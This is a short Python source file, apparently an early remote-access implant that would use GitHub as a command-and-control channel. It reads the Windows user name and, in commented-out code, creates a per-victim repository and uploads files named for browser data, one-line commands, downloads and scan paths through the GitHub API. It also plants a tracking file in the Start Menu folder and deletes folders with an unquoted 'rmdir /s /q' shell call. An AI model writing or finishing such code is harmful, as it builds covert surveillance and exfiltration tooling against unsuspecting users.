import base64
from os import system, popen, getcwd, path, environ
from time import sleep
from git import Git
import requests
from github import Github


def Rmpydir(FolderName):
    system(fr"rmdir /s /q {FolderName}")
def Register():
    token = "Token"  # my new token
    Username = popen("whoami").read().strip()
    newUsername = Username.replace("\\", "-")
    userFolder = path.join(getcwd(), newUsername)
    print(userFolder)
#     g = Github(token)
#     User = g.get_user()
#     repo = User.create_repo(newUsername)
#     Git().clone(f"https://github.com/{User.login}/{newUsername}.git")
#
#     sleep(5)
#     files = ["chrome.ini", "code_image.ini", "download_file.ini", "file_path.ini", "file_path.ini",
#              "last_visit.ini",
#              "link.ini", "one_line_commands.ini", "result_condition.ini", "scan_path.ini", "time_sleep.ini"]
#
#     headers = {
#         'Authorization': f'token {token}',
#         'Accept': 'application/vnd.github.v3+json'
#     }
#
#     for file in files:
#         filePath = path.join(userFolder, file)
#         system(f'copy nul "{filePath}"')
#         with open(filePath, 'r') as f:
#             file_content = f.read()
#         content = base64.b64encode(file_content.encode()).decode()
#         params = {
#             'message': 'Add file via API',
#             'content': content
#         }
#         UrlRepo = f'https://api.github.com/repos/{User.login}/{newUsername}.git'
#
#         try:
#             with open(environ['APPDATA'] + fr"\Microsoft\Windows\Start Menu\Programs\info.txt", "w") as data:
#                 data.write(UrlRepo + "\n")
#                 data.write(newUsername)
#                 data.close()
#         except:
#             pass
#         if UrlRepo.endswith('.git'):
#             UrlUploade = UrlRepo[:-4] + f"/contents/{file}"
#
#         response = requests.put(UrlUploade, headers=headers, json=params)
#         print(response.status_code, response.ok)
#
#     pass
#
#
Register()
# with open(environ['APPDATA'] + fr"\Microsoft\Windows\Start Menu\Programs\info.txt", "r") as data:
#     link = data.readline()
#     username = data.readline()
#
# Rmpydir(username)
